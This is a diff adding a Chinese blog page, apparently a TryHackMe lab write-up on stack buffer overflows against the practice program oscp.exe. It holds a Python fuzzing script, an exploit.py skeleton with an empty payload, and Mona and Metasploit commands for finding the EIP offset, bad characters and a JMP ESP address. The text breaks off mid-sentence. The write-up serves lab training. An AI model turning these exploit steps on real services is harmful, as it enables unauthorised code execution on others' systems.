@@ -1,0 +1,729 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="buffer overflow缓冲区是用来存储数据的一块内存区域。当程序向缓冲区写入数据时，如果写入的数据超过了缓冲区的容量，就会导致缓冲区溢出。这可能会导致数据覆盖到相邻的内存区域，破坏程序的正常执行。 攻击者通过向程序输入超过缓冲区容量的数据，覆盖堆栈中的关键信息。例如，攻击者可以将恶意代码放入缓冲区溢出的数据中，并覆盖返回地址为恶意代码所在的内存地址。当函数执行完毕后，程序会跳转到恶意代码所">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme_buffer_overflow">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2023/09/07/tryhackme-buffer-overflow/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="buffer overflow缓冲区是用来存储数据的一块内存区域。当程序向缓冲区写入数据时，如果写入的数据超过了缓冲区的容量，就会导致缓冲区溢出。这可能会导致数据覆盖到相邻的内存区域，破坏程序的正常执行。 攻击者通过向程序输入超过缓冲区容量的数据，覆盖堆栈中的关键信息。例如，攻击者可以将恶意代码放入缓冲区溢出的数据中，并覆盖返回地址为恶意代码所在的内存地址。当函数执行完毕后，程序会跳转到恶意代码所">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028012207899.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020045527.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020756514.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028021305630.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022130865.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022656783.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028023818737.png">
+<meta property="article:published_time" content="2023-09-07T11:10:47.000Z">
+<meta property="article:modified_time" content="2024-09-07T11:12:32.394Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028012207899.png">
+  
+  
+  
+  <title>tryhackme_buffer_overflow - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="tryhackme_buffer_overflow"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-07 19:10" pubdate>
+          2023年9月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">tryhackme_buffer_overflow</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="buffer-overflow"><a href="#buffer-overflow" class="headerlink" title="buffer overflow"></a>buffer overflow</h2><p>缓冲区是用来存储数据的一块内存区域。当程序向缓冲区写入数据时，如果写入的数据超过了缓冲区的容量，就会导致缓冲区溢出。这可能会导致数据覆盖到相邻的内存区域，破坏程序的正常执行。</p>
+<p>攻击者通过向程序输入超过缓冲区容量的数据，覆盖堆栈中的关键信息。例如，攻击者可以将恶意代码放入缓冲区溢出的数据中，并覆盖返回地址为恶意代码所在的内存地址。当函数执行完毕后，程序会跳转到恶意代码所在的地址，从而执行攻击者的恶意操作。</p>
+<h3 id="栈溢出："><a href="#栈溢出：" class="headerlink" title="栈溢出："></a>栈溢出：</h3><p>栈溢出涉及栈中的三个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020">寄存器</a>(32)：esp,eip,ebp–&gt;对应64位的rsp,rip,rbp</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">esp:</span>指向当前栈帧的顶部。<br><span class="hljs-symbol">ebp:</span>指向当前栈帧的底部。<br><span class="hljs-symbol">eip:</span>指向当前栈帧中执行的指令（可以理解为读取esp地址中所对应的信息）<br></code></pre></td></tr></table></figure>
+
+<p>可以理解为esp是location  eip是information</p>
+<h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><p>exp开发软件 python写的</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">左上角是CPU窗口<span class="hljs-comment">------显示了正在处理的代码的反汇编指令。</span><br>右上角是寄存器窗口<span class="hljs-comment">------显示所有通用寄存器。</span><br>左下角是内存窗口<span class="hljs-comment">---------以十六进制的形式显示任何被选中的内存块。</span><br>右下角是堆栈窗口<span class="hljs-comment">---------显示调用的堆栈和解码后的函数参数（任何原生的API调用）。</span><br>最底下白色的窗口是命令栏<span class="hljs-comment">-----能够像windbg一样使用命令控制调试器，或者执行PyCommands命令。</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Mona"><a href="#Mona" class="headerlink" title="Mona"></a><strong>Mona</strong></h3><p>Immunnity Debugger的插件</p>
+<p>命令</p>
+<p>用以下命令配置一个工作文件夹</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-title">!mona</span> config -set workingfolder <span class="hljs-keyword">c</span>:\mona\<span class="hljs-variable">%p</span><br>//<span class="hljs-variable">%p</span>代表进程的名称<br></code></pre></td></tr></table></figure>
+
+<h3 id="fuzzing测试"><a href="#fuzzing测试" class="headerlink" title="fuzzing测试"></a>fuzzing测试</h3><p>找到大概多少字节会导致缓冲区溢出使目标程序崩溃</p>
+<p>也就是找到目标应用程序崩溃时 EIP 寄存器偏移的一般范围。</p>
+<p>下面的脚本内容并非通用，实际环境下的fuzz脚本可能会涉及username、pass等参数。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br>import <span class="hljs-built_in">socket</span>, <span class="hljs-built_in">time</span>, sys<br><br>ip = <span class="hljs-string">&quot;MACHINE_IP&quot;</span><br><br>port = 端口<br>timeout = <span class="hljs-number">5</span><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br><br><span class="hljs-keyword">string</span> = prefix + <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> True:<br>  <span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM) <span class="hljs-keyword">as</span> s:<br>      s.settimeout(timeout)<br>      s.connect((ip, port))<br>      s.recv(<span class="hljs-number">1024</span>)<br>      print(<span class="hljs-string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">string</span>) - <span class="hljs-built_in">len</span>(prefix)))<br>      s.<span class="hljs-built_in">send</span>(<span class="hljs-keyword">bytes</span>(<span class="hljs-keyword">string</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>      s.recv(<span class="hljs-number">1024</span>)<br>  except:<br>    print(<span class="hljs-string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">string</span>) - <span class="hljs-built_in">len</span>(prefix)))<br>    sys.exit(<span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">string</span> += <span class="hljs-number">100</span> * <span class="hljs-string">&quot;A&quot;</span><br>  <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p>fuzzing发送之后检查当前Immunity Debugger中的EIP是否被A的ASCII码\x41覆盖</p>
+<h3 id="崩溃复制和控制-EIP"><a href="#崩溃复制和控制-EIP" class="headerlink" title="崩溃复制和控制 EIP"></a><strong>崩溃复制和控制 EIP</strong></h3><p>为了控制应用程序的流程，我们有必要控制EIP寄存器，因为它指向下一条指令，为此必须知道确切的偏移量。</p>
+<p>要找到目标程序崩溃时EIP寄存器确切的EIP偏移量。</p>
+<p>exploit.py</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import socket<br><br>ip = <span class="hljs-string">&quot;MACHINE_IP&quot;</span><br>port = 1337<br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = 0<br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-section">try:</span><br>  s.connect((ip, port))<br>  //s.recv(1024)   脚本要根据实际情况变形，比如说程序的第二个输入才有缓冲区溢出时，应该先revc,然后send一条无关紧要的，然后再revc（1024） ，然后在send出真正的payload<br>  print(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(bytes(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  print(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-section">except:</span><br>  print(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>offset暂时设置为0</p>
+<p>生成payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-variable">$num_fuzzing</span>+<span class="hljs-number">400</span><br></code></pre></td></tr></table></figure>
+
+<p>重启oscp.exe</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">每次于攻击机中运行 exploit.<span class="hljs-keyword">py</span>脚本（我们将多次运行该脚本并进行增量修改）之前，我们都必须执行restart操作（在虚拟靶机中使用Immunity Debugger重新打开oscp.<span class="hljs-keyword">exe</span>文件）。<br></code></pre></td></tr></table></figure>
+
+<p>发送payload</p>
+<p>查看Immunity Debugger右下角程序的状态是否由running变为pause</p>
+<p>exploit.py脚本应该会再次使 oscp.exe 相关的服务器崩溃</p>
+<p>然后将distance 更改为与刚才所创建的模式相同的长度值</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!mona findmsp -<span class="hljs-built_in">distance</span> $num_fuzzing+<span class="hljs-number">400</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028012207899.png" srcset="/img/loading.gif" lazyload alt="image-20231028012207899"></p>
+<p><strong>distance</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">distance </span>的值将表示我们将从哪个位置开始查找寄存器<br>使用能够导致崩溃的缓冲区长度并生成一个唯一的缓冲区，这样我们就可以确定覆盖 <span class="hljs-keyword">EIP </span>寄存器的模式中的确切偏移量，以及其他寄存器指向的模式中的偏移量。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!mona</span> <span class="hljs-string">findmsp</span> <span class="hljs-string">-distance</span> <span class="hljs-number">2400</span><br></code></pre></td></tr></table></figure>
+
+<p>使用随机数据一路填充到”EIP offset”，然后我们就可以控制EIP</p>
+<h3 id="验证EIP偏移量"><a href="#验证EIP偏移量" class="headerlink" title="验证EIP偏移量"></a>验证EIP偏移量</h3><p>获得EIP寄存器中的偏移量填入到exploit.py中offset</p>
+<p>“retn ” 变量值设置为“BBBB”</p>
+<p>payload清空</p>
+<p>重启oscp.exe</p>
+<p>发送payload</p>
+<p>此时EIP寄存器应该已被BBBB覆盖（ASCII值为42424242）</p>
+<h3 id="寻找坏字符"><a href="#寻找坏字符" class="headerlink" title="寻找坏字符"></a>寻找坏字符</h3><p>badcode可能会干扰我们的 shellcode 的执行或导致我们的shellcode不被接受</p>
+<p>有一些通常被忽略的“badchars”如00、0a、0d、20等，为了识别它们，我们首先要生成一个包含所有字符的字符串。</p>
+<p>使用该脚本生成\x01到\xff的字符</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> <span class="hljs-attribute">x</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-attribute">x</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
+
+<p>将生成的字符填入payload，重启靶机，发送payload，<em><strong>记下ESP 寄存器所指向的地址</strong></em></p>
+<p>在虚拟靶机的Immunity中使用 mona 命令生成字节数组，默认排除空字节 (\x00)，请注意生成的 bytearray.bin 文件的位置（如果根据前面提到的参考指南中的 Mona 配置部分设置了工作文件夹，则该位置应为 C:\mona\oscp\bytearray.bin），相关命令为：</p>
+<p><code>!mona bytearray -b &quot;\x00&quot;</code> 生成bytearray.bin</p>
+<p>输入下面这条命令查看badchar</p>
+<p>badchar比较命令</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a &lt;<span class="hljs-keyword">address&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p> <img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020045527.png" srcset="/img/loading.gif" lazyload alt="image-20231028020045527"></p>
+<p>00在生成payload时已经被排除，所以从07开始看</p>
+<p>首先 #使用Immunity生成新数组，生成的数组中不包含\x00字符和\x07字符。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x07&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后，在payload中去除07，重启oscp.exe，发送payload</p>
+<p>然后，<em><strong>记下ESP 寄存器所指向的地址，</strong></em>输入mona badchar比较命令</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020756514.png" srcset="/img/loading.gif" lazyload alt="image-20231028020756514"></p>
+<p>08没了 说明07是坏的，08是好的</p>
+<p>接着去掉2e</p>
+<p>!mona bytearray -b “\x00\x07\x2e” payload中也去掉</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028021305630.png" srcset="/img/loading.gif" lazyload alt="image-20231028021305630"></p>
+<p>说明2e是坏的，2f是好的。</p>
+<p>接着去掉a0。</p>
+<p>!mona bytearray -b “\x00\x07\x2e\xa0” payload中也去掉</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022130865.png" srcset="/img/loading.gif" lazyload alt="image-20231028022130865"></p>
+<p>出现这个说明a0也是坏的 </p>
+<p>结束</p>
+<p>OVERFLOW1远程程序入口点对应的真实坏字符为：”\x00\x07\x2e\xa0”</p>
+<p>若不是以上的情况</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#基于badchars的初始输出结果中的相邻字符进行判断</span><br>把<span class="hljs-number">23</span>去掉，在输出结果中<span class="hljs-number">24</span>没了而<span class="hljs-number">23</span>还在，说明<span class="hljs-number">23</span>是坏的。<br>!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x23&quot;</span><span class="hljs-comment">;exploit脚本中也去掉\x23</span><br><br>把<span class="hljs-number">3</span>c去掉，在输出结果中<span class="hljs-number">3</span>d没了而<span class="hljs-number">3</span>c还在，说明<span class="hljs-number">3</span>c是坏的。<br>!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x23\x3c&quot;</span><span class="hljs-comment">;exploit脚本中也去掉\x23\x3c</span><br><br>以此类推......<br><span class="hljs-number">1</span>.把<span class="hljs-number">07</span>在脚本里面删了，坏字符串这里<span class="hljs-number">07</span>还在上榜，<span class="hljs-number">08</span>没了；<span class="hljs-number">07</span>是坏的<br><span class="hljs-number">2</span>.把<span class="hljs-number">08</span>从脚本里面删了，<span class="hljs-number">07</span>还在坏字符串榜上，<span class="hljs-number">08</span>也上榜了，<span class="hljs-number">07</span>是坏的<br><span class="hljs-number">3</span>.把<span class="hljs-number">08</span>从脚本里面删了，<span class="hljs-number">07</span>、<span class="hljs-number">08</span>都在坏字符串榜上，还多个<span class="hljs-number">09</span>；<span class="hljs-number">07</span>是坏的   也有可能一对儿两个都是坏的<br>坏字符只可能是最开始!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00&quot;</span> 出来那个表里面的 ，凭空多出来的不算<br></code></pre></td></tr></table></figure>
+
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><h4 id="寻找跳跃点"><a href="#寻找跳跃点" class="headerlink" title="寻找跳跃点"></a>寻找跳跃点</h4><p>使用 Mona 查找 JMP 点并相应地更新漏洞利用脚本中的 RETN 变量。</p>
+<p>启动oscp.exe</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">!mona <span class="hljs-keyword">jmp</span> -r esp -cpb <span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span><br><span class="hljs-meta">#-cpb 选项用于排除坏字符</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022656783.png" srcset="/img/loading.gif" lazyload alt="image-20231028022656783"></p>
+<p>选择“日志数据”窗口的输出结果中的一个地址并用于更新exploit.py 脚本中的“retn”变量</p>
+<p>0x625011af—-&gt; 62  50  11  af  —-&gt; \x62  \x50  \x11 \xaf  —-&gt;<code>\xaf\x11\x50\62</code></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">由函数调用过程可知，一般情况下，<span class="hljs-built_in">ESP</span>中地址总是指向系统栈且不会被溢出的数据破坏，当函数返回时，<span class="hljs-built_in">ESP</span>所指的位置是淹没的返回地址的下一位（子函数平衡栈<span class="hljs-keyword">ret</span> n时，<span class="hljs-built_in">ESP</span>将指向下n位）。<br><br>开始进行出栈读写操作：<span class="hljs-built_in">eip</span>=<span class="hljs-built_in">esp</span>，<span class="hljs-built_in">eip</span>将从<span class="hljs-built_in">esp</span>的地址中指向的命令进行读取，逐步出栈，此时<span class="hljs-built_in">esp</span>开始往低地址位靠近，当<span class="hljs-built_in">esp</span>=<span class="hljs-built_in">ebp</span>时，<span class="hljs-built_in">ebp</span>读取现位置中存储的地址数据发生跳转，跳到父函数<span class="hljs-built_in">ebp</span>处。<br><br>此时<span class="hljs-built_in">esp</span>继续出栈，获取return addr，<span class="hljs-built_in">eip</span>跳转至父函数栈顶位置，跳跃后<span class="hljs-built_in">eip</span>继续根据<span class="hljs-built_in">esp</span>所含数据开始执行命令，就可以完成<span class="hljs-built_in">eip</span>的函数执行步骤（此处要注意<span class="hljs-keyword">ret</span>：<span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span>），在本小节中：由于<span class="hljs-built_in">eip</span>函数的返回地址被我们填充为指向<span class="hljs-keyword">jmp</span> <span 